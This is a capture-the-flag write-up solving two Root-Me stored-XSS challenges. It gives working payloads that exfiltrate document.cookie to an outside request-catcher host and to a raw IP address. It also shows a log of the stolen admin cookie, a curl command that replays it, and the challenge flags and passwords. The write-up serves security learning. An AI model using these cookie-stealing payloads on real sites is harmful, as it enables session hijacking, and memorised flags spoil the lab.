# XSS Stored

## Stored 1

### Description

Steal the administrator session cookie and use it to validate this challenge.

[Start the challenge](http://challenge01.root-me.org/web-client/ch18/)

### Solution

Normal messages work, but if anything is surround with HTML tags then it's not added.

![xss---stored.png](/assets/ctf/root-me/xss-stored.png)

Filter seems to be working only on Title, if there's HTML element inside it's not processed, but Message gets added like that.

![xss---stored-1.png](/assets/ctf/root-me/xss-stored-1.png)

To solve challenge we need admin's cookies
```html
Title: Anything
Message: <img src=x onerror="this.src='https://uwuos.free.beeceptor.com/?c='+document.cookie; this.removeAttribute('onerror');">
```

Wait for some time and you should get callback with admin cookie

![xss---stored-2.png](/assets/ctf/root-me/xss-stored-2.png)

::: tip Flag
`NkI9qe4cdLIO2P7MIsWS8ofD6`
:::

## Stored 2

### Description

Steal the administrator session’s cookie and go in the admin section.

[Start the challenge](http://challenge01.root-me.org/web-client/ch19/)
### Solution

Same trick from previous challenge doesn't work. Title is still blocked if we try to inject html, Message doesn't get added as html, but just text.

![xss---stored-3.png](/assets/ctf/root-me/xss-stored-3.png)

There's an admin button which goes to [http://challenge01.root-me.org/web-client/ch19/?section=admin](http://challenge01.root-me.org/web-client/ch19/?section=admin). This doesn't do much, but `Tsss` value is added above button? Trying other values doesn't seem to do anything.

We have cookie called status, which is reflected on HTML

![xss---stored-4.png](/assets/ctf/root-me/xss-stored-4.png)

But doesn't seem to be injectiable.

![xss---stored-5.png](/assets/ctf/root-me/xss-stored-5.png)

The cookie value is somehow embedded inside HTML, using `"</h1><h1>Test</h1>"` we can escape it and inject arbitrary html.

![xss---stored-6.png](/assets/ctf/root-me/xss-stored-6.png)

Set the cookie to be payload
```js
document.cookie=`status="</i><img src=x onerror="this.src='http://152.67.76.29:4444/?c='+document.cookie; this.removeAttribute('onerror');">`
```

> **Note**: The following payload did not remove `onerror` event and kept continually making request... Potentially DOS-ing service you use 😳 I wasn't able to get around this, but you can close the page and wait for the admin to visit page. 

```bash
➜  ~ cat requests.log | grep status | sort | uniq
  c: status="</i><img src=x onerror="this.src='http://SERVER:4444/?c=' document.cookie
  c: status=Test
  c: status=invite; ADMIN_COOKIE=SY2USDIH78TF3DFU78546TE7F
```

![xss---stored-7.png](/assets/ctf/root-me/xss-stored-7.png)

or just curl
```bash
➜ curl 'http://challenge01.root-me.org/web-client/ch19/?section=admin' -b 'ADMIN_COOKIE=SY2USDIH78TF3DFU78546TE7F' -s | bash pass
<h3>Vous pouvez valider ce challenge avec ce mot de passe / You can validate challenge with this pass : E5HKEGyCXQVsYaehaqeJs0AfV
```

::: tip Flag
`E5HKEGyCXQVsYaehaqeJs0AfV`
:::

